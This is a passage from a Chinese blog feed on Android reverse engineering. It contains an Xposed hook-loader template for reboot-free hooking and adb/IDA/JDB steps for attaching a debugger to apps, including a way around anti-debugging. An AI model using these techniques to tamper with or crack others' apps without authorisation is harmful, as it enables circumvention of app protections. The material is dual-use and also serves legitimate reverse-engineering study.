<span class="title">HookLoader</span> <span class="keyword">implements</span> <span class="title">IXposedHookLoadPackage</span> </span>&#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 当前Xposed模块的包名,方便寻找apk文件</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> String modulePackage = <span class="string">&quot;$&#123;packageName&#125;&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 宿主程序的包名(允许多个),过滤无意义的包名,防止无意义的apk文件加载</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> List&lt;String&gt; hostAppPackages = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 实际hook逻辑处理类</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> String handleHookClass = $&#123;xposedModClass&#125;.class.getName();</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 实际hook逻辑处理类的入口方法</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> String handleHookMethod = <span class="string">&quot;handleLoadPackage&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="comment">// <span class="doctag">TODO:</span> Add the package name of application your want to hook!</span></span><br><span class="line">        hostAppPackages.add(<span class="string">&quot;$&#123;hookPackageName&#125;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">handleLoadPackage</span><span class="params">(<span class="keyword">final</span> XC_LoadPackage.LoadPackageParam loadPackageParam)</span> <span class="keyword">throws</span> Throwable </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (hostAppPackages.contains(loadPackageParam.packageName)) &#123;</span><br><span class="line">            XposedHelpers.findAndHookMethod(Application.class, <span class="string">&quot;attach&quot;</span>, Context.class, <span class="keyword">new</span> XC_MethodHook() &#123;</span><br><span class="line">                <span class="meta">@Override</span></span><br><span class="line">                <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">afterHookedMethod</span><span class="params">(MethodHookParam param)</span> <span class="keyword">throws</span> Throwable </span>&#123;</span><br><span class="line">                    Context context=(Context) param.args[<span class="number">0</span>];</span><br><span class="line">                    loadPackageParam.classLoader = context.getClassLoader();</span><br><span class="line">                    invokeHandleHookMethod(context, handleHookClass, handleHookMethod, loadPackageParam);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 安装app以后，通过动态加载这个apk文件，调用相应的方法</span></span><br><span class="line"><span class="comment">     * 从而实现免重启</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> context context参数</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> handleHookClass   指定由哪一个类处理相关的hook逻辑</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> loadPackageParam  传入XC_LoadPackage.LoadPackageParam参数</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@throws</span> Throwable 抛出各种异常,包括具体hook逻辑的异常,寻找apk文件异常,反射加载Class异常等</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">invokeHandleHookMethod</span><span class="params">(Context context, String handleHookClass, String handleHookMethod, XC_LoadPackage.LoadPackageParam loadPackageParam)</span> <span class="keyword">throws</span> Throwable </span>&#123;</span><br><span class="line"></span><br><span class="line">        String apkPath = context.getPackageManager().getApplicationInfo(<span class="keyword">this</span>.modulePackage,PackageManager.GET_META_DATA).sourceDir;</span><br><span class="line">        PathClassLoader pathClassLoader = <span class="keyword">new</span> PathClassLoader(apkPath, ClassLoader.getSystemClassLoader());</span><br><span class="line"></span><br><span class="line">        Class&lt;?&gt; cls = Class.forName(handleHookClass, <span class="keyword">true</span>, pathClassLoader);</span><br><span class="line">        Object instance = cls.newInstance();</span><br><span class="line">        Method method = cls.getDeclaredMethod(handleHookMethod, XC_LoadPackage.LoadPackageParam.class);</span><br><span class="line">        method.invoke(instance, loadPackageParam);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><p><strong>文章作者是通过区分不同的sdk以实现找到apk的findapk的方法，实际上这里有很简便的方法:<br>通过系统API便可找到对应的apk路径:</strong></p><p>一行代码即可搞定</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">String apkPath = context.getPackageManager().getApplicationInfo(<span class="keyword">this</span>.modulePackage,PackageManager.GET_META_DATA).sourceDir;</span><br></pre></td></tr></table></figure><h3 id="0x03-产出"><a href="#0x03-产出" class="headerlink" title="0x03 产出"></a>0x03 产出</h3><ol><li>XpdModule 需重启</li><li>XpdFreeRebootModule 免重启</li></ol><p>公司不让用Github,暂时无法上传代码,以后有机会再上传。</p><h3 id="参考文章-amp-致谢"><a href="#参考文章-amp-致谢" class="headerlink" title="参考文章 &amp; 致谢"></a>参考文章 &amp; 致谢</h3><p><a href="https://blog.csdn.net/u011956004/article/details/78612502">Xposed模块开发,免重启改进方案</a></p><p><a href="https://github.com/DVDAndroid/XposedModuleTemplate">Xposed Module Template for Android Studio</a></p><p>感谢参考文章的作者以及同事。</p>]]></content>
    
    
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;###懒惰是科技的第一生产力&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3 id=&quot;0x00-背景&quot;&gt;&lt;a href=&quot;#0x00-背景&quot; class=&quot;headerlink&quot; title=&quot;0x00 背景&quot;&gt;&lt;/a&gt;0x00 背景&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;由于Android逆向每次想要使用Xposed进行Hook时，总是需要重复性地操作一遍Android Studio新建项目的流程.ps:当然可以只用一个项目，强迫症需要分开 ：）&lt;/li&gt;
&lt;li&gt;由于Xposed实现的方式，每次修改hook代码后，需要重启机器，这也是白白浪费了很多时间。&lt;/li&gt;
&lt;li&gt;基于以上两点，参考现有的方案，&lt;strong&gt;实现了一个Module,只需在AS中new一下即可解决问题&lt;/strong&gt;。&lt;/li&gt;
&lt;/ul&gt;</summary>
    
    
    
    <category term="代码干预" scheme="http://example.com/categories/%E4%BB%A3%E7%A0%81%E5%B9%B2%E9%A2%84/"/>
    
    <category term="Hook" scheme="http://example.com/categories/%E4%BB%A3%E7%A0%81%E5%B9%B2%E9%A2%84/Hook/"/>
    
    <category term="Xposed" scheme="http://example.com/categories/%E4%BB%A3%E7%A0%81%E5%B9%B2%E9%A2%84/Hook/Xposed/"/>
    
    
    <category term="Xposed" scheme="http://example.com/tags/Xposed/"/>
    
  </entry>
  
  <entry>
    <title>Android逆向系列之动态调试-七-–IDA调试so文件-下</title>
    <link href="http://example.com/2016/06/08/Android%E9%80%86%E5%90%91%E7%B3%BB%E5%88%97%E4%B9%8B%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95-%E4%B8%83-%E2%80%93IDA%E8%B0%83%E8%AF%95so%E6%96%87%E4%BB%B6-%E4%B8%8B/"/>
    <id>http://example.com/2016/06/08/Android%E9%80%86%E5%90%91%E7%B3%BB%E5%88%97%E4%B9%8B%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95-%E4%B8%83-%E2%80%93IDA%E8%B0%83%E8%AF%95so%E6%96%87%E4%BB%B6-%E4%B8%8B/</id>
    <published>2016-06-08T01:49:25.000Z</published>
    <updated>2021-05-22T13:10:54.204Z</updated>
    
    <content type="html"><![CDATA[<p>Android逆向系列之动态调试(零)–入门篇</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;Android逆向系列之动态调试(零)–入门篇&lt;/p&gt;
</summary>
      
    
    
    
    <category term="逆向分析" scheme="http://example.com/categories/%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/"/>
    
    
    <category term="Android逆向" scheme="http://example.com/tags/Android%E9%80%86%E5%90%91/"/>
    
  </entry>
  
  <entry>
    <title>Android逆向系列之动态调试-六-–IDA调试so文件</title>
    <link href="http://example.com/2016/06/07/Android%E9%80%86%E5%90%91%E7%B3%BB%E5%88%97%E4%B9%8B%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95-%E5%85%AD-%E2%80%93IDA%E8%B0%83%E8%AF%95so%E6%96%87%E4%BB%B6/"/>
    <id>http://example.com/2016/06/07/Android%E9%80%86%E5%90%91%E7%B3%BB%E5%88%97%E4%B9%8B%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95-%E5%85%AD-%E2%80%93IDA%E8%B0%83%E8%AF%95so%E6%96%87%E4%BB%B6/</id>
    <published>2016-06-07T01:49:25.000Z</published>
    <updated>2021-05-22T13:10:54.205Z</updated>
    
    <content type="html"><![CDATA[<h3 id="一、Android-Server-准备工作"><a href="#一、Android-Server-准备工作" class="headerlink" title="一、Android Server 准备工作"></a>一、Android Server 准备工作</h3><ol><li>根据手机位数,选择对应的android_server(ida/dbgsrv)</li><li>将其push到手机(adb push android_server /data/local/tmp)</li><li>赋予执行权限(adb shell chmod 777 an_ser)</li></ol><h3 id="二、直接附加调试"><a href="#二、直接附加调试" class="headerlink" title="二、直接附加调试"></a>二、直接附加调试</h3><ol><li>启动Android_server</li><li>端口转发(adb forward tcp:23946 tcp:23946) </li><li>启动欲调试APK(adb shell am start -n {pkgname}/{Activity}) </li><li>启动IDA，打开debugger-&gt;attach-&gt;remote Armlinux/andoid debugger</li><li>填写host和端口，选择进程，attach</li></ol><h3 id="二、反反调试调试"><a href="#二、反反调试调试" class="headerlink" title="二、反反调试调试"></a>二、反反调试调试</h3><ol><li>启动Android_server</li><li>端口转发(adb forward tcp:23946 tcp:23946)</li><li>调试模式启动Apk(adb shell am start -D -n {pkgname}/{Activity}) </li><li>启动IDA，打开debugger-&gt;attach-&gt;remote Armlinux/andoid debugger</li><li>填写host和端口,选择进程,attach</li><li>端口转发(adb forward tcp:8700 jdwp:{pid}) 或者 打开DDMS,选择对应进程</li><li>JDB桥接(jdb -connect “com.sun.jdi.SocketAttach:hostname=127.0.0.1,port=8700”)</li><li>下断点,按F9运行</li></ol><p>RUN – 启动一个新的进程 调试比如 Android下的二进制程序<br>ATTACH – 附加到一个已经运行到进程 调试比如 运行的APK</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;一、Android-Server-准备工作&quot;&gt;&lt;a href=&quot;#一、Android-Server-准备工作&quot; class=&quot;headerlink&quot; title=&quot;一、Android Server 准备工作&quot;&gt;&lt;/a&gt;一、Android Server 准备工作&lt;/</summary>
      
    
    
    
    <category term="逆向分析" scheme="http://example.com/categories/%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/"/>
    
    
    <category term="Android逆向" scheme="http://example.com/tags/Android%E9%80%86%E5%90%91/"/>
    
  </entry>
  
  <entry>
    <title>Android逆向系列之动态调试-五-–gdb调试</title>
    <link href="http://example.com/2016/06/06/Android%E9%80%86%E5%90%91%E7%B3%BB%E5%88%97%E4%B9%8B%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95-%E4%BA%94-%E2%80%93gdb%E8%B0%83%E8%AF%95/"/>
    <id>http://example.com/2016/06/06/Android%E9%80%86%E5%90%91%E7%B3%BB%E5%88%97%E4%B9%8B%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95-%E4%BA%94-%E2%80%93gdb%E8%B0%83%E8%AF%95/</id>
    <published>2016-06-06T01:49:25.000Z</published>
    <updated>2021-05-22T13:10:54.204Z</updated>
    
    <content type="html"><![CDATA[<p>Android逆向系列之动态调试(零)–入门篇</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;Android逆向系列之动态调试(零)–入门篇&lt;/p&gt;
</summary>
      
    
    
    
    <category term="逆向分析" scheme="http://example.com/categories/%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/"/>
    
    
    <category term="Android逆向" scheme="http://example.com/tags/Android%E9%80%86%E5%90%91/"/>
    
  </entry>
  
  <entry>
    <title>Android逆向系列之动态调试-四-–JDB调试</title>
    <link href="http://example.com/2016/06/05/Android%E9%80%86%E5%90%91%E7%B3%BB%E5%88%97%E4%B9%8B%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95-%E5%9B%9B-%E2%80%93JDB%E8%B0%83%E8%AF%95/"/>
    <id>http://example.com/2016/06/05/Android%E9%80%86%E5%90%91%E7%B3%BB%E5%88%97%E4%B9%8B%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95-%E5%9B%9B-%E2%80%93JDB%E8%B0%83%E8%AF%95/</id>
    <published>2016-06-05T01:49:25.000Z</published>
    <updated>2021-05-22T13:10:54.205Z</updated>
    
    <content type="html"><![CDATA[<p>Android逆向系列之动态调试(零)–入门篇</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;Android逆向系列之动态调试(零)–入门篇&lt;/p&gt;
</summary>
      
    
    
    
    <category term="逆向分析" scheme="http://example.com/categories/%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/"/>
    
    
    <category term="Android逆向" scheme="http://example.com/tags/Android%E9%80%86%E5%90%91/"/>
    
  </entry>
  
  <entry>
    <title>Android逆向系列之动态调试-三-–IDA调试dex</title>
    <link href="http://example.com/2016/06/04/Android%E9%80%86%E5%90%91%E7%B3%BB%E5%88%97%E4%B9%8B%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95-%E4%B8%89-%E2%80%93IDA%E8%B0%83%E8%AF%95dex/"/>
    <id>http://example.com/2016/06/04/Android%E9%80%86%E5%90%91%E7%B3%BB%E5%88%97%E4%B9%8B%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95-%E4%B8%89-%E2%80%93IDA%E8%B0%83%E8%AF%95dex/</id>
    <published>2016-06-04T01:49:25.000Z</published>
    <updated>2021-05-22T13:10:54.204Z</updated>
    
    <content type="html"><![CDATA[<p>Android逆向系列之动态调试(零)–入门篇</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;Android逆向系列之动态调试(零)–入门篇&lt;/p&gt;
</summary>
      
    
    
    
    <category term="逆向分析" scheme="http://example.com/categories/%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/"/>
    
    
    <category term="Android逆向" scheme="http://example.com/tags/Android%E9%80%86%E5%90%91/"/>
    
  </entry>
  
  <entry>
    <title>Android逆向系列之动态调试-二-–Eclipse调试apk</title>
    <link href="http://example.com/2016/06/03/Android%E9%80%86%E5%90%91%E7%B3%BB%E5%88%97%E4%B9%8B%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95-%E4%BA%8C-%E2%80%93Eclipse%E8%B0%83%E8%AF%95apk/"/>
    <id>http://example.com/2016/06/03/Android%E9%80%86%E5%90%91%E7%B3%BB%E5%88%97%E4%B9%8B%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95-%E4%BA%8C-%E2%80%93Eclipse%E8%B0%83%E8%AF%95apk/</id>
    <published>2016-06-03T01:49:25.000Z</published>
    <updated>2021-05-22T13:10:54.204Z</updated>
    
    <content type="html"><![CDATA[<p>Android逆向系列之动态调试(零)–入门篇</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;Android逆向系列之动态调试(零)–入门篇&lt;/p&gt;
</summary>
      
    
    
    
    <category term="逆向分析" scheme="http://example.com/categories/%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/"/>
    
    
    <category term="Android逆向" scheme="http://example.com/tags/Android%E9%80%86%E5%90%91/"/>
    
  </entry>
  
  <entry>
    <title>Android逆向系列之动态调试-一-–Smali注入</title>
    <link href="http://example.com/2016/06/02/Android%E9%80%86%E5%90%91%E7%B3%BB%E5%88%97%E4%B9%8B%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95-%E4%B8%80-%E2%80%93Smali%E6%B3%A8%E5%85%A5/"/>
    <id>http://example.com/2016/06/02/Android%E9%80%86%E5%90%91%E7%B3%BB%E5%88%97%E4%B9%8B%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95-%E4%B8%80-%E2%80%93Smali%E6%B3%A8%E5%85%A5/</id>
    <published>2016-06-02T01:49:25.000Z</published>
    <updated>2021-05-22T13:10:54.204Z</updated>
    
    <content type="html"><![CDATA[<p>Android逆向系列之动态调试(零)–入门篇</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;Android逆向系列之动态调试(零)–入门篇&lt;/p&gt;
</summary>
      
    
    
    
    <category term="逆向分析" scheme="http://example.com/categories/%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/"/>
    
    
    <category term="Android逆向" scheme="http://example.com/tags/Android%E9%80%86%E5%90%91/"/>
    
  </entry>
  
  <entry>
    <title>Android逆向系列之动态调试(零)–入门篇</title>
    <link href="http://example.com/2016/06/01/Android%E9%80%86%E5%90%91%E7%B3%BB%E5%88%97%E4%B9%8B%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95-%E9%9B%B6-%E2%80%93%E5%85%A5%E9%97%A8%E7%AF%87/"/>
    <id>http://example.com/2016/06/01/Android%E9%80%86%E5%90%91%E7%B3%BB%E5%88%97%E4%B9%8B%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95-%E9%9B%B6-%E2%80%93%E5%85%A5%E9%97%A8%E7%AF%87/</id>
    <published>2016-06-01T01:49:25.000Z</published>
    <updated>2021-05-22T13:10:54.205Z</updated>
    
    <content type="html"><![CDATA[<p>Android逆向系列之动态调试(零)–入门篇</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;Android逆向系列之动态调试(零)–入门篇&lt;/p&gt;
</summary>
      
    
    
    
    <category term="逆向分析" scheme="http://example.com/categories/%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/"/>
    
    
    <category term="Android逆向" scheme="http://example.com/tags/Android%E9%80%86%E5%90%91/"/>
    
  </entry>
  
</feed>
